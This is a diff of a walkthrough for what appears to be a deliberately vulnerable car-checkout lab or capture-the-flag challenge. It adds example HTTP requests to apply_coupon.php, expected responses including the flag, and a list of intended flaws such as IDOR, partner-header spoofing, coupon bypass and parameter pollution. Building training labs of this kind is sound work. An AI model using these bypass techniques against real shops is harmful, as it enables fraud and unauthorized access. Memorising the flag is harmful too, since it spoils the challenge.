@@ -291,7 +291,26 @@ quote_id=1&reservation_id=1&coupon=PURPLE-STAFF
 
 Expected: `coupon_channel_mismatch` or seller approval related errors depending on state.
 
-After seller approval, use partner context. Parameter pollution demonstrates parser inconsistency:
+After seller approval, it still fails if the active request does not carry the partner channel header. Partner state stored on the quote/reservation is necessary, but it is not sufficient:
+
+```http
+POST /api/apply_coupon.php HTTP/1.1
+Host: localhost:8098
+Content-Type: application/x-www-form-urlencoded
+Cookie: PHPSESSID=...
+
+quote_id=1&reservation_id=1&coupon=PURPLE-STAFF
+```
+
+Expected:
+
+```json
+{
+  "error": "coupon_not_valid_for_public_checkout"
+}
+```
+
+After seller approval, use the active partner context. Parameter pollution demonstrates parser inconsistency:
 
 ```http
 POST /api/apply_coupon.php HTTP/1.1
@@ -334,6 +353,8 @@ Expected:
 ```json
 {
   "confirmed": true,
+  "order_id": 1,
+  "order_ref": "VC-ORD-9001",
   "payment_method": "partner_settlement",
   "flag": "FLAG{impossible_is_just_context_reused_correctly}"
 }
@@ -355,7 +376,7 @@ Expected:
 2. Cross-object IDOR: quote, reservation, car, seller ref, and internal reservation are paired inconsistently.
 3. Broken access control: `seller/reservation.php` relies on `X-Violet-Channel` plus internal reference.
 4. Business logic flaw: final order can follow legacy/seller/coupon state instead of public UI order.
-5. Coupon bypass: `PURPLE-STAFF` works only after partner/seller state.
+5. Coupon bypass: `PURPLE-STAFF` works only with an active partner header plus partner/seller state.
 6. Legacy abuse: `legacy/quote-sync.php` creates seller context from migrated quote state.
 7. Header confusion: `X-Violet-Channel: partner_checkout` changes selected endpoint behavior.
 8. Cache/state confusion: quote/reservation channel state is reused after sync and hold.
